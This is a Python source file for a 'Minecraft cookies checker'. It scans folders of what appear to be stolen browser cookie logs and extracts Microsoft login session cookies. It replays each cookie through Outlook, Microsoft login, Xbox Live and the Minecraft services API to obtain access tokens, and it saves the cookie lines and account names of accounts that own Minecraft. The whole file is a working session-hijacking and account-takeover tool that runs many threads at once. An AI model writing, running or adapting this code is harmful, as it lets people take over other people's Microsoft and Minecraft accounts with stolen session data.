import requests,colorama,uuid,string,random,json,base64,os,re
from conn import conn
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
from url_parser import parse_url
import easygui,sys
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3,ctypes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class MINECRAFT:

    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'MINECRAFT COOKIES CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
███╗   ███╗██╗███╗   ██╗███████╗ ██████╗██████╗  █████╗ ███████╗████████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
████╗ ████║██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██╔████╔██║██║██╔██╗ ██║█████╗  ██║     ██████╔╝███████║█████╗     ██║       ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║     ██╔══██╗██╔══██║██╔══╝     ██║       ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║██║ ╚████║███████╗╚██████╗██║  ██║██║  ██║██║        ██║       ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝        ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                     
                                                                                                                                                                          
*************************                                                                                                                              
@BINARY_THUG
*************************                                                                                                                                                                
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))
    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, NF_line
    def returndigstrin(self,lenght):
        apa=[0,1,2,3,4,6,7,8,9,]
        strting=''
        for l in range(lenght):
            strting=str(random.choice(apa))+strting
        return strting
            
    def request(self,mscs,line,dt,fil):
        total_minecraft=0
        gameslist=[]
        u=uuid.uuid4()
        url=f"https://outlook.live.com/owa/?cobrandid={u}&nlp=1&deeplink=owa/"
        headers = {
        'Host': 'outlook.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://www.microsoft.com/',
        'Connection': 'keep-alive',
        'Cookie': f'PPLState=1; MSPAuth=Disabled; MSPProf=Disabled; mkt=en-US; mkt1=en-US; MH=MSFT;__Host-MSAAUTHP:{mscs}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'same-origin',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Encoding': 'gzip, deflate',
        }
        reg=requests.get(url, headers=headers, allow_redirects=False, verify=False)
        if 'Location'in reg.headers:
            pass
        else:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        loc=reg.headers['Location']
        dict_reg=reg.cookies.get_dict()
        cookie_sys="; ".join([f"{name}:{value}" for name , value in dict_reg.items()])
        headers_txt = {
        'Host': 'login.live.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.microsoft.com/',
        'Connection': 'keep-alive',
        'Cookie': f'MSPAuth=Disabled; MSPProf=Disabled;wlidperf=FR=L&ST=1705619177513; __Host-MSAAUTHP={mscs}; PPLState=1; logonLatency=LGN01=638412443803116689',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Accept-Encoding': 'gzip, deflate',
        }
        url_2=loc
        try:
            toc=requests.get(url_2,headers=headers_txt,verify=False)
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        if '__Host-MSAAUTHP' in toc.cookies.get_dict():
            pass
        else:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        xboxuri=f"https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId={uuid.uuid4()}&tid={self.returndigstrin(9)}&ru=https%3A%2F%2Fwww.minecraft.net%2Fen-us%2Flogin&aid={self.returndigstrin(10)}"
        xbox_headers={
    'Host': 'sisu.xboxlive.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.minecraft.net/',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Accept-Encoding': 'gzip, deflate',
        }
        tctp=requests.get(xboxuri,xbox_headers,verify=False,allow_redirects=False)
        loc_7=tctp.headers['Location']
        fullk = {
    'Host': 'login.live.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.minecraft.net/',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Cookie': '; '.join([f"{name}={value}"for name,value in toc.cookies.get_dict().items()]),
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Accept-Encoding': 'gzip, deflate',
}
        try:
            milagay=requests.get(loc_7,headers=fullk,allow_redirects=False,verify=False)
            loc_8=milagay.headers['Location']
            mahiay=requests.get(loc_8,verify=False,allow_redirects=False,headers=xbox_headers)
            m=str(parse_url(mahiay.headers['Location'])['fragment']).replace("state=login&accessToken=",'')
            uhs,bearer=self.dceode_return(m)
        except:
            self.invalid=self.invalid+1
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            return None
        hea_beaerer = {
    'Host': 'api.minecraftservices.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.minecraft.net/',
    'Content-Type': 'application/json',
    'Origin': 'https://www.minecraft.net',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'Accept-Encoding': 'gzip, deflate',
}
        ujson={
        "ensureLegacyEnabled" : True,
        "identityToken" : f"XBL3.0 x={uhs};{bearer}"}
        try:
            kafir=requests.post("https://api.minecraftservices.com/authentication/login_with_xbox",headers=hea_beaerer,json=ujson,verify=False)
            acesstoken=kafir.json()['access_token']
        except:
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalid=self.invalid+1
            return None
        heui = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.minecraft.net/",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {acesstoken}",
    "Origin": "https://www.minecraft.net",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Accept-Encoding": "gzip, deflate",
}
        query='https://api.minecraftservices.com/entitlements'
        suk=requests.get(query,headers=heui,verify=False)
        for items in suk.json()['items']:
            gameslist.append(items['name'])
        for l in gameslist:
            if 'minecraft' in str(l).lower():
                total_minecraft=total_minecraft+1
        if total_minecraft==0:
            HASMINECRAFT=False
        else:
            HASMINECRAFT=True
        if HASMINECRAFT==True:
            try:
                getprofileinfoname=requests.get("https://api.minecraftservices.com/minecraft/profile",headers=heui,verify=False).json()['name']
            except:
                print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                self.invalid=self.invalid+1
                return None
            outy=os.path.join(dt,f"[{getprofileinfoname}].txt")
            with open(outy,'w',errors='ignore',encoding='utf-8') as mil:
                for lne in line:
                    mil.write(lne)
                mil.write("\n\n=====================================================\n")
                mil.write(f"\nName:{getprofileinfoname}\nBY:@BINARY_THUG\n\nGAMES:\n")
                for lines in gameslist:
                    if 'minecraft' in lines:
                        mil.write(lines+"\n")
                mil.write("\n\n=====================================================\n")
            self.valid=self.valid+1
            print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")      
        else:
            self.invalid=self.invalid+1
            print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            return None
                
    def __init__(self) -> None:
        self.valid=0
        self.invalid=0
        self.total=0
        self.glob_tr=True
    def runner(self,logs_path,workers,datetime,):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.checker,pat,datetime)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[MINECRAFT Checker]--BY @BINARY_THUG|VALIDS:{self.valid}|INVALIDS:{self.invalid}|TOTAL LOGS FOLDER:{len(lin)}")
    
                
                
        
        
    def dceode_return(self,base64_string):
        base64_string += "=" * ((4 - len(base64_string) % 4) % 4)
        decoded_bytes = base64.b64decode(base64_string)

        decoded_string = decoded_bytes.decode('utf-8')
        jso=json.loads(decoded_string)
        for item in jso:
            if item.get('Item1') == 'rp://api.minecraftservices.com/':
                token = item['Item2']['Token']
                uhs = item['Item2']['DisplayClaims']['xui'][0]['uhs']
                return uhs,token
    def checker(self, path,dt):
        for root, dirs, files in os.walk(path):
            for fil in files:
                if str(fil).endswith(".txt"):
                    full_path = os.path.join(root, fil)
                    cookie, NF_LINES = self.net_to_cookie(full_path, "login.live.com")
                    if '__Host-MSAAUTHP' in cookie:
                        msc=cookie['__Host-MSAAUTHP']
                        huntoni=self.request(msc,NF_LINES,dt,fil)
                    else:
                        self.invalid=self.invalid+1
                        print(colorama.Fore.RED+"[T] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                        continue
    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append(os.path.join(root, dir))
        return set(paths)
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)  
def main():
    colorama.init()
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    maximize_console_window()
    os.system("cls")
    d=MINECRAFT()
    d.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder(current)
        logs_pathi=easygui.diropenbox(title="MINECRAFT COOKIE CHECKER- SELECT LOGS FOLDER")
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>31:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 30 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        os.system("cls")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        d.runner(logs_pathi,int(thread_num),s)
        os.system("cls")
        d.ui()
        d.print_horizontal_line()
        print(d.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(d.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(d.center(colorama.Fore.CYAN+"ENJOY YOUR MINECRAFT COOKIES"+colorama.Fore.RESET))
        d.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[MINECRAFTCOOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{d.valid}|INVALIDS:{d.invalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()